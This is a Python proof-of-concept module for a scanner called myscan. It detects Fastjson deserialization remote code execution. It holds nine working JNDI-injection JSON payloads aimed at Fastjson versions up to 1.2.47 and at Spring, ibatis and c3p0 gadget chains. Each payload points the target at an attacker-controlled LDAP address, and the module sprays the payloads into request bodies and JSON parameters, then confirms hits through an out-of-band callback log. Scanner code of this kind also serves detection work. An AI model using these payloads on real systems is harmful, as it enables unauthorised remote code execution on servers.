#!/usr/bin/env python3
# @Time    : 2020-06-11
# @Author  : caicai
# @File    : poc_fastjson_deserialization_rce_2020.py
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.base import PocBase
from myscan.lib.core.common import get_random_str, isjson
from myscan.lib.core.common_reverse import generate, query_reverse
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.threads import mythread
from myscan.lib.core.data import cmd_line_options


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.parse = dictdata_parser(self.dictdata)
        self.url = workdata.get(
            "data")  # self.url为需要测试的url，但不会包含url参数，如https://www.baidu.com/index.php#tip1 .不会携带url参数，如?keyword=1
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "fastjson_deserialization_rce"
        self.vulmsg = "cool rce ! exploit it ! "
        self.level = 1  # 0:Low  1:Medium 2:High
        self.saveflags = {}

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        if not self.can_output(self.parse.getrootpath() + self.name):  # 限定只输出一次
            return

        needtests = []
        # body为json类型
        if self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
            needtests.append(None)

        # 针对参数为json格式

        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        for param in params:
            arg = param.get("value", "")
            if isjson(arg):
                needtests.append(param)
        # test payloads
        payloads = [
            {
                "vul": "ver=1.2.47",
                "payload": '''{
    "rasdnd1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "randfd2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "%(ldap)s", 
        "autoCommit": true
    }
}''',
                "type": "ldap"
            },
            {
                "vul": "ver=1.2.43",
                "payload": '''{"raasdnd1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"%(ldap)s","autoCommit":true]}}''',
                "type": "ldap"

            },
            {
                "vul": "ver=1.2.42",
                "payload": '''{
  "rasdfnd1": {
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "1.2.25<=ver<=1.2.41",
                "payload": '''{
  "ranfasdfd1": {
    "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "<=1.2.24",
                "payload": '''{
  "radassnd1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "%(ldap)s",
    "autoCommit": true
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "ibatis-core:3.0",
                "payload": '''{
  "raasdnd1": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "%(ldap)s"
    }
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "spring-context:4.3.7.RELEASE",
                "payload": '''{
  "ransdasd1": {
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "%(ldap)s",
    "propertyPath": "foo",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "%(ldap)s"
      ]
    }
  }
}''',
                "type": "ldap"
            },
            {
                "vul": "unknown",
                "payload": '''{
  "raasd2nd1": Set[
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "%(ldap)s"
      ]
    },
    "adviceBeanName": "%(ldap)s"
  },
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
  }
]}''',
                "type": "ldap"
            },
            {
                "vul": "unknown",
                "payload": '''{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "%(ldap)s",
    "loginTimeout": 0
  }
}''',
                "type": "ldap"
            }
        ]
        datas = []
        for payload in payloads:
            for arg in needtests:
                datas.append((payload, arg))
        mythread(self.send_payload, datas, cmd_line_options.threads)
        # query reverse log
        sleep = True
        for hexdata, msg in self.saveflags.items():
            payload, vul = msg
            res, resdata = query_reverse(hexdata, sleep)
            sleep = False
            if res:
                self.result.append({
                    "name": self.name,
                    "url": self.parse.getrootpath(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "payload": payload,
                        "version": vul,
                        "others": "dnslog res:{}".format(resdata),
                        "request": self.parse.getrequestraw(),
                        "response": self.parse.getresponseraw()
                    }
                })
                self.can_output(self.parse.getrootpath() + self.name, True)

    def send_payload(self, data):
        payload, param = data
        random_str = get_random_str(5).lower() + payload.get("vul", "")
        data_with_payload = ""
        if payload.get("type") == "ldap":
            ldapaddr, ldaphexdata = generate(self.parse.getrootpath() + random_str, "ldap")
            data_with_payload = payload.get("payload") % {"ldap": ldapaddr}
            self.saveflags[ldaphexdata] = (data_with_payload, payload.get("vul", ""))
        elif payload.get("type") == "rmi":
            rmiaddr, rmihexdata = generate(self.parse.getrootpath() + random_str, "rmi")
            data_with_payload = payload.get("payload") % {"rmi": rmiaddr}
            self.saveflags[rmihexdata] = (data_with_payload, payload.get("vul", ""))
        if param is None:
            req = self.parse.generaterequest({"data": data_with_payload})
        else:
            req = self.parse.getreqfromparam(param, "w", data_with_payload)
        r = request(**req)
